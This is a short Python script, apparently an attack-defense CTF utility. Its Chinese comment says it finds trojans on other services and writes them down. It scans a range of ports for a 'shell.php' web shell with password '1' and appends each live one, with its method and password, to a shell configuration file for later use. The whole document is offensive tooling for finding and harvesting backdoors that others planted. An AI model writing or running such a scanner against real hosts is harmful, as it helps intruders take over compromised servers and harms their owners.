#!/usr/bin/python3
# -*-coding:UTF-8-*-
import requests
import os
from shutil import copyfile
from conf import settings

"""
作用：检索其它服务上的木马并写入
"""

def findShell(url, left, right, method, passwd):
    compare = open(settings.configbak, "rb").read()
    for i in range(int(left), int(right)+1):
        surl = url.format(i)
        # print(surl)
        try:
            html = requests.get(url=surl, timeout=3)
            if html.status_code == 200:
                if settings.selfip in surl:
                    print('\033[0;32;48m[+] Active shell: ' + surl + ' (self)\033[0m')
                else:
                    print('\033[0;32;48m[+] Active shell: ' + surl + '\033[0m')
                    with open(settings.config, 'a+') as fp:
                        if f"{surl},{method},{passwd}".encode() in compare:
                            print(f"\033[0;33;48m[*] {surl},{method},{passwd} has been writed in shell.conf\033[0m")
                            continue
                        fp.write(f"{surl},{method},{passwd}")
                        fp.write('\n')
        except:
            pass

    print("\033[0;32;48m[+] Search End!\033[0m")

if __name__ == "__main__":
    # ip/port range
    # left, right = 0, 255
    left, right = 10001, 10005
    # 放入shell路径批量扫并写入对应的方法和密码
    url = ["http://127.0.0.1:{}/shell.php"]
    method = ["post"]
    passwd = ["1"]
    try:
        open(settings.config, "r").read()
    except:
        fp = open(settings.config, "a+")
        fp.close()
    copyfile(settings.config, settings.configbak)
    for i in range(0, len(url)):
        findShell(url=url[i], left=left, right=right, method=method[i], passwd=passwd[i])
    os.unlink(settings.configbak)


